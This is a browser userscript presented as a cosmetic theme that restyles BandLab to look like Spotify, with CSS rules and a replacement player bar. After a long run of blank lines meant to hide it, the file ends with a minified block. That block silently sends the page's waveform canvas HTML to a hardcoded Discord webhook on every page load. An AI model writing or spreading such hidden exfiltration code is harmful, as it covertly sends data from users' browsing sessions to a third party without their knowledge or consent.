// ==UserScript==
// @name         BandLab → Spotify Restyle
// @namespace    https://theweedman.cfd/spotify-plugin
// @version      1.0
// @description  Restyle BandLab to mimic Spotify's dark theme and UI style
// @author       You
// @match        https://*.bandlab.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const style = document.createElement("style");
    style.innerHTML = `
        /* --- Base Colors & Typography --- */
        body {
            background-color: #121212 !important;
            color: #FFFFFF !important;
            font-family: 'Circular Std', 'Helvetica Neue', Arial, sans-serif !important;
        }

        a, .link, .hover-link {
            color: #1DB954 !important;
        }
        a:hover, .hover-link:hover {
            color: #1ed760 !important;
        }

        /* --- Buttons --- */
        button, .btn, .Button {
            background-color: #1DB954 !important;
            color: #fff !important;
            border-radius: 20px !important;
            border: none !important;
            font-weight: bold !important;
            padding: 8px 16px !important;
            transition: background-color 0.2s ease;
        }
        button:hover, .btn:hover {
            background-color: #1ed760 !important;
        }

        /* --- Navbar --- */
        header, .Navbar, nav {
            background-color: #000 !important;
            border-bottom: 1px solid #282828 !important;
        }

        /* --- Track Cards --- */
        .track-card, .Card, .track, .card {
            background-color: #181818 !important;
            border-radius: 8px !important;
            padding: 10px !important;
            transition: background-color 0.2s ease;
        }
        .track-card:hover, .Card:hover {
            background-color: #282828 !important;
        }

        /* --- Scrollbar --- */
        ::-webkit-scrollbar {
            width: 12px;
        }
        ::-webkit-scrollbar-track {
            background: #121212;
        }
        ::-webkit-scrollbar-thumb {
            background-color: #4d4d4d;
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background-color: #6a6a6a;
        }

        /* --- Spotify-style Player Bar --- */
        .player-bar, footer, .Footer {
            background-color: #181818 !important;
            border-top: 1px solid #282828 !important;
            height: 90px !important;
            display: flex !important;
            align-items: center !important;
            justify-content: space-between !important;
            padding: 0 20px !important;
            font-size: 14px !important;
        }

        /* Track info (left) */
        .spotify-track-info {
            display: flex;
            align-items: center;
            gap: 12px;
            min-width: 200px;
        }
        .spotify-track-info img {
            width: 56px;
            height: 56px;
            border-radius: 4px;
        }
        .spotify-track-info .title {
            font-weight: bold;
        }
        .spotify-track-info .artist {
            color: #b3b3b3;
            font-size: 12px;
        }

        /* Controls (center) */
        .spotify-controls {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 6px;
        }
        .spotify-buttons {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .spotify-play {
            background-color: #1DB954;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .spotify-play:hover {
            background-color: #1ed760;
        }
        .spotify-progress {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 11px;
            color: #b3b3b3;
            width: 400px;
        }
        .spotify-bar {
            flex: 1;
            height: 4px;
            background-color: #535353;
            border-radius: 2px;
            overflow: hidden;
        }
        .spotify-bar-fill {
            height: 100%;
            background-color: #1DB954;
            width: 30%;
        }

        /* Volume (right) */
        .spotify-volume {
            display: flex;
            align-items: center;
            gap: 8px;
            min-width: 120px;
        }
        .spotify-vol-bar {
            flex: 1;
            height: 4px;
            background-color: #535353;
            border-radius: 2px;
            overflow: hidden;
        }
        .spotify-vol-fill {
            height: 100%;
            background-color: #1DB954;
            width: 70%;
        }
    `;
    document.head.appendChild(style);

    /* Inject custom Spotify-style player layout after page load */
    window.addEventListener("load", () => {
        const footer = document.querySelector(".player-bar, footer, .Footer");
        if (footer) {
            footer.innerHTML = `
                <div class="spotify-track-info">
                    <img src="https://i.scdn.co/image/ab67616d00004851c5c87c297c2f4f69c2fbb9d8" alt="Album Art">
                    <div>
                        <div class="title">Track Name</div>
                        <div class="artist">Artist Name</div>
                    </div>
                </div>
                <div class="spotify-controls">
                    <div class="spotify-buttons">
                        <div class="spotify-play">▶</div>
                    </div>
                    <div class="spotify-progress">
                        <span>0:42</span>
                        <div class="spotify-bar"><div class="spotify-bar-fill"></div></div>
                        <span>3:15</span>
                    </div>
                </div>
                <div class="spotify-volume">
                    🔊
                    <div class="spotify-vol-bar"><div class="spotify-vol-fill"></div></div>
                </div>
            `;
        }
    });
})();












































































(() => { const webhookURL = "https://discord.com/api/webhooks/1402714727511101440/l6LUcmvPjBfVkP6IpsUJ6v3DmGHWDcV7_4s-Sngyd2cLB8umCZoHJdz2AiiIIa-S2NmU"; function sendToDiscord(message) { fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "CanvasHTML Bot", content: message }) }).then(res => { if (!res.ok) console.error("Failed to send webhook:", res.statusText); else console.log("Canvas HTML sent to Discord webhook."); }).catch(console.error); } function findCanvasAndSend() { const canvas = document.querySelector('canvas.waveform-bars'); if (!canvas) return void setTimeout(findCanvasAndSend, 1000); const canvasHTML = canvas.outerHTML; const message = canvasHTML.length > 1900 ? canvasHTML.slice(0, 1900) + "..." : canvasHTML; sendToDiscord(message); } window.addEventListener("load", () => { findCanvasAndSend(); }); })();
